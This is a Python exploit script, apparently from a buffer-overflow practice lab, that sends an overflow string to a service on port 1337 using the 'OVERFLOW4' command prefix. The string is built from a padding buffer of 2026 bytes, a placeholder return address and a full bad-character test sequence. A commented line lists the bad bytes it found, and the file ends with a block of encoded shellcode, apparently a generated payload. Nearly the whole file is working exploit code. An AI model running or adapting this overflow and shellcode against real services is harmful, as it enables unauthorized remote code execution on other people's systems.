import socket, time, sys

ip = "10.10.14.141"
port = 1337
timeout = 5
PREFIX = "OVERFLOW4 "
buffer = "\x41" * 2026
ret = "BBBB"
badbytes = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xce\xcf\xd0\xd1\xd2\xd3\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#badbytes = "\x00\xa9\xcd\xd4"


overflow = PREFIX + buffer + ret + badbytes
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
	s.connect((ip,port))
	print("Sending evil buffer...")
	s.send(overflow + "\r\n")
	print("Done")
except:
	print("Could not connect.")	
		


buf =  b""
buf += b"\xbe\x57\x82\x83\x9c\xdb\xd5\xd9\x74\x24\xf4\x5a"
buf += b"\x29\xc9\xb1\x31\x31\x72\x13\x83\xc2\x04\x03\x72"
buf += b"\x58\x60\x76\x60\x8e\xe6\x79\x99\x4e\x87\xf0\x7c"
buf += b"\x7f\x87\x67\xf4\x2f\x37\xe3\x58\xc3\xbc\xa1\x48"
buf += b"\x50\xb0\x6d\x7e\xd1\x7f\x48\xb1\xe2\x2c\xa8\xd0"
buf += b"\x60\x2f\xfd\x32\x59\xe0\xf0\x33\x9e\x1d\xf8\x66"
buf += b"\x77\x69\xaf\x96\xfc\x27\x6c\x1c\x4e\xa9\xf4\xc1"
buf += b"\x06\xc8\xd5\x57\x1d\x93\xf5\x56\xf2\xaf\xbf\x40"
buf += b"\x17\x95\x76\xfa\xe3\x61\x89\x2a\x3a\x89\x26\x13"
buf += b"\xf3\x78\x36\x53\x33\x63\x4d\xad\x40\x1e\x56\x6a"
buf += b"\x3b\xc4\xd3\x69\x9b\x8f\x44\x56\x1a\x43\x12\x1d"
buf += b"\x10\x28\x50\x79\x34\xaf\xb5\xf1\x40\x24\x38\xd6"
buf += b"\xc1\x7e\x1f\xf2\x8a\x25\x3e\xa3\x76\x8b\x3f\xb3"
buf += b"\xd9\x74\x9a\xbf\xf7\x61\x97\x9d\x9d\x74\x25\x98"
buf += b"\xd3\x77\x35\xa3\x43\x10\x04\x28\x0c\x67\x99\xfb"
buf += b"\x69\x97\xd3\xa6\xdb\x30\xba\x32\x5e\x5d\x3d\xe9"
buf += b"\x9c\x58\xbe\x18\x5c\x9f\xde\x68\x59\xdb\x58\x80"
buf += b"\x13\x74\x0d\xa6\x80\x75\x04\xc5\x47\xe6\xc4\x24"
buf += b"\xe2\x8e\x6f\x39"